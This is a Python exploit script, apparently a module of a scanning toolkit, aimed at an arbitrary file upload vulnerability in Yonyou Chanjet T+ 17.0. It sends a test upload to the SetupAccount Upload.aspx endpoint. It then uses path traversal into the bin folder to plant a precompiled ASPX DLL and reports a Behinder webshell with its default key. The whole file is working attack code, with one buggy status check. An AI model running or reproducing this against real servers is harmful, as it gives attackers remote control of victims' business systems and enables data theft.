import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging


def exp(exp_url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    file1 = [('file1', (
    '../../../bin/App_Web_index.aspx.cdcab7d2.dll', open('bin/App_Web_index.aspx.cdcab7d2.dll', 'rb'), 'image/png'))]
    file2 = [('file2', (
    '../../../bin/index.aspx.cdcab7d2.compiled', open('bin/index.aspx.cdcab7d2.compiled', 'rb'), 'image/png'))]
    exp = [('filee', ('index.aspx', open('bin/index.aspx', 'rb'), 'image/png'))]
    try:
        exp_m = requests.post(exp_url, headers=headers, files=exp, verify=False)
        exp_r = requests.post(exp_url, headers=headers, files=file1, verify=False)
        exp_x = requests.post(exp_url, headers=headers, files=file2, verify=False)
        if exp_m.status_code == 200 and exp_r.status_code == 200 and exp_x == 200:
            shell_url = '目标+/tplus/index.aspx?preload=1'
            print(Vcolors.RED + "[+] 文件上传成功, 冰蝎默认明文密钥WebShell: {}".format(shell_url) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 文件上传失败"+Vcolors.ENDC)
    except:
        logging.error("用友畅捷通T_updata_任意文件上传脚本出现异常")



def 用友畅捷通T_updata_任意文件上传(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=---------------------------33007515338361897914262830846",
    }
    exp_url = urldata + "tplus/SM/SetupAccount/Upload.aspx?preload=1"
    data = '''-----------------------------33007515338361897914262830846
    Content-Disposition: form-data; name="File1"; filename="test.html"
    Content-Type: image/jpeg

    test
    -----------------------------33007515338361897914262830846--'''

    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=exp_url, headers=headers, data=data, verify=False)
        if response.status_code == 200:
            print(Vcolors.RED + "[+] 畅捷通T+17.0任意文件上传漏洞存在"+Vcolors.ENDC)
            exp(exp_url)
        else:
            print(Vcolors.WARNING +"[x] 畅捷通T+17.0任意文件上传漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("用友畅捷通T_updata_任意文件上传脚本出现异常")



